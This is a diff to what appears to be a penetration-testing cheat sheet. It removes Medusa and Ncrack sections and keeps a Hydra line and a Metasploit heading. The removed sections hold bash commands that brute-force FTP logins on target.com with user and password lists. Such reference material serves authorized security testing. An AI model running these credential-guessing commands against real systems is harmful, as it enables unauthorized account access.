@@ -318,42 +318,6 @@ hydra -l admin -P passwords.txt -f ftp://target.com
 
 ---
 
-### Medusa
-
-```bash
-# Basic brute force
-medusa -h target.com -u admin -P passwords.txt -M ftp
-
-# Multiple users
-medusa -h target.com -U users.txt -P passwords.txt -M ftp
-
-# Threads
-medusa -h target.com -u admin -P passwords.txt -M ftp -t 10
-
-# Verbose
-medusa -h target.com -u admin -P passwords.txt -M ftp -v 6
-
-# Output
-medusa -h target.com -u admin -P passwords.txt -M ftp -O ftp_results.txt
-```
-
----
-
-### Ncrack
-
-```bash
-# Brute force
-ncrack -p 21 -u admin -P passwords.txt target.com
-
-# Multiple targets
-ncrack -p 21 -U users.txt -P passwords.txt target1.com target2.com
-
-# Rate limiting
-ncrack -p 21 -u admin -P passwords.txt --connection-limit 5 target.com
-```
-
----
-
 ### Metasploit
 
 ```bash
